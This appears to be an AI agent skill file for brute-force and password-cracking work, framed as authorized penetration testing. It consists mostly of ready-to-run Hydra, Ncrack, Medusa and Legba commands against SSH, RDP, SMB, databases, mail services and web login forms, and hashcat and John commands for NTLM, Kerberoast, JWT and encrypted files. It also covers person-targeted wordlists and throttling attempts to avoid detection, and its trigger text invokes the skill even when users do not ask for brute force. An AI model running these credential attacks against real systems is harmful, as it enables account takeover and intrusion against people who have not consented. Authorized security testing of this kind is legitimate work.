---
name: brute-force-assistant
description: Use this skill for authorized penetration testing and security assessments involving brute force attacks, password cracking, and credential testing. Trigger this skill when users need to test authentication systems, crack password hashes, generate custom wordlists, or perform service-specific brute force operations. Make sure to use this skill whenever the user mentions password cracking, hash cracking, brute force testing, credential testing, wordlist generation, or any authentication security assessment, even if they don't explicitly ask for 'brute force'.
---

# Brute Force Assistant

A comprehensive skill for authorized security testing involving brute force attacks, password cracking, and credential assessment.

## ⚠️ Authorization Required

**Always verify you have explicit written authorization before performing any brute force testing.** Unauthorized access attempts are illegal and unethical.

## When to Use This Skill

Use this skill when:
- Testing authentication systems in authorized penetration tests
- Cracking password hashes obtained during security assessments
- Generating custom wordlists for specific targets
- Testing service credentials (SSH, FTP, databases, etc.)
- Analyzing captured authentication hashes
- Performing password policy validation

## Workflow Overview

1. **Gather intelligence** - Research target, find default credentials, collect information
2. **Generate wordlists** - Create custom dictionaries based on target context
3. **Select attack method** - Choose appropriate tool and technique for the service
4. **Execute test** - Run brute force with proper rate limiting and logging
5. **Document results** - Record findings for the security report

## Default Credential Research

Start by checking for default credentials before attempting brute force:

### Key Resources
- **DefaultCreds-cheat-sheet**: https://github.com/ihebski/DefaultCreds-cheat-sheet
- **SecLists Default Passwords**: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv
- **WordList-Compendium**: https://github.com/Dormidera/WordList-Compendium
- **CIRT Passwords**: https://www.cirt.net/passwords

### Quick Search Pattern
```
"[service_name]" default password
"[device_model]" default credentials
"[vendor]" default admin password
```

## Wordlist Generation

### Using Crunch for Pattern-Based Lists

Generate passwords based on known patterns:

```bash
# Basic length range with custom charset
crunch 4 6 0123456789ABCDEF -o hex_passwords.txt

# Using predefined charsets
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha

# Template-based generation
# @ = lowercase, , = uppercase, % = numeric, ^ = special
crunch 6 8 -t ,@@^^%% -o template_passwords.txt
```

### Extracting Words from Target

```bash
# Cewl - extract words from target website
cewl example.com -m 5 -w target_words.txt

# Include subdomains and deeper pages
cewl -d 3 -m 4 example.com -w target_words.txt

# Tok - extract from multiple URLs
cat urls.txt | tok > extracted_words.txt
```

### CUPP - Context-Aware Password Generation

```bash
# Interactive mode - answer questions about target
python3 cupp.py -i

# Social engineering mode with known info
python3 cupp.py -t social -u "johndoe" -f "john" -l "doe"
```

### Wister - Advanced Wordlist Crafting

```bash
# Generate variations from known words
python3 wister.py -w "jane doe 2022 summer madrid 1998" -c 1 2 3 4 5 -o custom_wordlist.txt
```

### John the Ripper Mutation Rules

```bash
# Apply mutation rules to expand wordlist
john --wordlist=base_words.txt --rules --stdout > mutated_words.txt

# Apply all available rules
john --wordlist=base_words.txt --rules=all --stdout > all_mutated.txt
```

## Service-Specific Brute Force

### SSH Authentication Testing

```bash
# Hydra - fast, parallel testing
hydra -l root -P passwords.txt -t 32 <target_ip> ssh

# Ncrack - optimized for SSH
ncrack -p 22 --user root -P passwords.txt <target_ip> -T 5

# Medusa - multi-protocol support
medusa -u root -P passwords.txt -h <target_ip> -M ssh

# Legba - modern alternative
legba ssh --username admin --password wordlists/passwords.txt --target <target_ip>:22
```

### FTP Authentication Testing

```bash
hydra -l root -P passwords.txt <target_ip> ftp
ncrack -p 21 --user root -P passwords.txt <target_ip>
legba ftp --username admin --password wordlists/passwords.txt --target <target_ip>:21
```

### HTTP Basic Authentication

```bash
# Hydra with user list
hydra -L users.txt -P passwords.txt <target> http-get /admin/

# HTTPS mode
hydra -L users.txt -P passwords.txt <target> https-get /admin/

# Medusa with directory path
medusa -h <target> -u admin -P passwords.txt -M http -m DIR:/admin -T 10
```

### HTTP Form Authentication

```bash
# Hydra POST form brute force
hydra -L users.txt -P passwords.txt <target> \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -V

# HTTPS POST form
hydra -L users.txt -P passwords.txt <target> \
  https-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

### Database Services

#### MySQL
```bash
hydra -L users.txt -P passwords.txt <target_ip> mysql
legba mysql --username root --password wordlists/passwords.txt --target <target_ip>:3306
```

#### PostgreSQL
```bash
hydra -L users.txt -P passwords.txt <target_ip> postgres
legba pgsql --username admin --password wordlists/passwords.txt --target <target_ip>:5432
```

#### MongoDB
```bash
nmap -sV --script mongodb-brute -p 27017 <target_ip>
legba mongodb --target <target_ip>:27017 --username root --password wordlists/passwords.txt
```

#### MSSQL
```bash
hydra -L users.txt -P passwords.txt <target_ip> mssql
legba mssql --username SA --password wordlists/passwords.txt --target <target_ip>:1433
```

### Email Protocols

#### SMTP
```bash
hydra -l admin -P passwords.txt <target_ip> smtp
legba smtp --username admin@example.com --password wordlists/passwords.txt --target <target_ip>:25
```

#### IMAP
```bash
hydra -l username -P passwords.txt <target_ip> imap
hydra -S -l username -P passwords.txt -s 993 <target_ip> imap  # SSL
legba imap --username user --password wordlists/passwords.txt --target <target_ip>:993
```

#### POP3
```bash
hydra -l username -P passwords.txt <target_ip> pop3
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target <target_ip>:110
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target <target_ip>:995 --pop3-ssl
```

### Other Common Services

#### SMB
```bash
nmap --script smb-brute -p 445 <target_ip>
hydra -l Administrator -P passwords.txt <target_ip> smb -t 1
legba smb --target <target_ip> --username admin --password wordlists/passwords.txt
```

#### RDP
```bash
ncrack -vv --user admin -P passwords.txt rdp://<target_ip>
hydra -V -f -L users.txt -P passwords.txt rdp://<target_ip>
legba rdp --target <target_ip>:3389 --username admin --password wordlists/passwords.txt
```

#### VNC
```bash
hydra -L users.txt -P passwords.txt -s 5901 <target_ip> vnc
legba vnc --target <target_ip>:5901 --password wordlists/passwords.txt
```

#### Telnet
```bash
hydra -l root -P passwords.txt <target_ip> telnet
legba telnet --username admin --password wordlists/passwords.txt --target <target_ip>:23
```

## Hash Cracking

### Identifying Hash Types

```bash
# Use hash-identifier
hash-identifier
# Paste the hash when prompted

# Or check format manually:
# $1$ = MD5 crypt
# $2a$/$2b$/$2y$ = bcrypt
# $5$ = SHA256 crypt
# $6$ = SHA512 crypt
# NTLM = 32 hex characters
# MD5 = 32 hex characters
# SHA1 = 40 hex characters
```

### John the Ripper

```bash
# Basic cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt

# Specify format
john --format=NT --wordlist=rockyou.txt ntlm_hashes.txt
john --format=SHA256 --wordlist=rockyou.txt sha256_hashes.txt

# Show cracked passwords
john --show hashfile.txt

# Session management
john --session=mytest hashfile.txt
john --restore  # Resume last session
```

### Hashcat

```bash
# Wordlist attack with rules
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule

# Combinator attack (merge two wordlists)
hashcat -a 1 -m 1000 hash.txt wordlist1.txt wordlist2.txt

# Mask attack (pattern-based)
hashcat -a 3 -m 1000 hash.txt ?u?l?l?l?l?l?l?l?d

# Wordlist + mask
hashcat -a 6 -m 1000 hash.txt wordlist.txt ?d?d?d?d

# Show results
hashcat --show hash.txt
```

### Common Hashcat Modes

| Mode | Hash Type | Format |
|------|-----------|--------|
| 0 | MD5 | 32 hex chars |
| 100 | SHA1 | 40 hex chars |
| 1400 | SHA256 | 64 hex chars |
| 1700 | SHA512 | 128 hex chars |
| 1000 | NTLM | 32 hex chars |
| 3000 | LM | 16 hex chars |
| 500 | MD5 crypt | $1$... |
| 3200 | bcrypt | $2a$... |
| 7400 | SHA256 crypt | $5$... |
| 1800 | SHA512 crypt | $6$... |
| 13100 | Kerberoast | $krb5tgs$... |

### JWT Token Cracking

```bash
# Using jwtcrack
python3 crackjwt.py <jwt_token> /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py -d wordlists.txt <jwt_token>

# Using hashcat
hashcat -m 16500 -a 0 jwt.txt rockyou.txt

# Using John
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

## File Password Cracking

### ZIP Files

```bash
# fcrackzip
fcrackzip -u -D -p rockyou.txt encrypted.zip

# John the Ripper
zip2john encrypted.zip > zip.hash
john zip.hash

# Hashcat
hashcat -m 13600 -a 0 zip.hash rockyou.txt
```

### 7z Files

```bash
# Direct testing
cat rockyou.txt | 7za t archive.7z

# John the Ripper
./7z2john.pl archive.7z > 7z.hash
john 7z.hash
```

### PDF Files

```bash
# pdfcrack
pdfcrack encrypted.pdf -w rockyou.txt

# Decrypt after finding password
qpdf --password=<PASSWORD> --decrypt encrypted.pdf decrypted.pdf
```

### Office Documents

```bash
# Convert to hash
office2john.py document.docx > office.hash
john office.hash
```

## Best Practices

### Rate Limiting

Always use rate limiting to avoid:
- Account lockouts
- Service disruption
- Detection by security systems

```bash
# Hydra - limit threads
hydra -t 4 <target> <service>

# Add delays between attempts
hydra -w 5 <target> <service>  # 5 second wait
```

### Session Management

```bash
# John the Ripper
john --session=mysession hashfile.txt
john --restore  # Resume
john --kill  # Stop session

# Hashcat
hashcat --session=mysession hash.txt
hashcat --restore
hashcat --status
```

### Result Validation

Always verify cracked credentials:
```bash
# Test SSH access
ssh -o BatchMode=yes -o ConnectTimeout=5 user@host

# Test database connection
mysql -h host -u user -p'password'
```

### Logging

```bash
# Log all attempts and results
hydra -L users.txt -P passwords.txt target service 2>&1 | tee brute_force.log

# Save successful credentials
hydra -L users.txt -P passwords.txt target service -f -C
```

## Common Wordlists

- **rockyou.txt** - Most common, from SecLists
- **SecLists** - https://github.com/danielmiessler/SecLists
- **Probable-Wordlists** - https://github.com/berzerk0/Probable-Wordlists
- **Kaonashi** - https://github.com/kaonashi-passwords/Kaonashi

## Troubleshooting

### Connection Issues
- Verify target is reachable: `ping <target>`
- Check port is open: `nmap -p <port> <target>`
- Verify service is running: `nmap -sV -p <port> <target>`

### Slow Performance
- Increase threads: `-t 32` (be careful with lockouts)
- Use smaller wordlists for initial testing
- Try hashcat with GPU acceleration

### Account Lockouts
- Reduce thread count
- Add delays between attempts
- Use smaller wordlists
- Test on non-production systems first

## References

- [SecLists](https://github.com/danielmiessler/SecLists)
- [John the Ripper Documentation](https://openwall.info/wiki/john)
- [Hashcat Documentation](https://hashcat.net/wiki/doku.php)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
